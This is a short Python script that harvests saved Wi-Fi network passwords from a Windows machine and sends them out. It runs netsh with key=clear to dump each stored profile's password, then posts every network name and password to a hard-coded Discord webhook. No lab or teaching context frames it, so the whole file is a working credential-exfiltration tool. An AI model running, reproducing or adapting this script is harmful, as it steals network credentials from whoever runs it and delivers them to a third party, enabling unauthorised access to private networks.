import subprocess
import re
import requests
import json
webhook_url = "https://discordapp.com/api/webhooks/1184606146644947134/iCjUJ6ALD-G_kK4WwQjymH1sCE3JRtWGhnDFhZzdsNe-Y-hV-m6QF225_3JDNdAOMvL4"

def get_wifi_profiles():
    result = subprocess.run(["powershell","netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
    profiles = re.findall(r"\s*:\s(.*)", result.stdout)
    return profiles

def get_wifi_passwords(profiles):
    wifi_passwords = {}
    for profile in profiles:
        profile_result = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"],capture_output=True, text=True)
        wifi_passwords[profile] = profile_result.stdout.strip()
    return wifi_passwords

def main(): 
    wifi_profiles = get_wifi_profiles()
    wifi_passwords = get_wifi_passwords(wifi_profiles)
    for profile, password in wifi_passwords.items():
        data = {
            "content": (f"WiFi Network: {profile}, Password: {password}")
        }
        headers = {
        "Content-Type": "application/json"
        }
        response = requests.post(webhook_url, data=json.dumps(data), headers=headers)

if __name__ == "__main__":
    main()





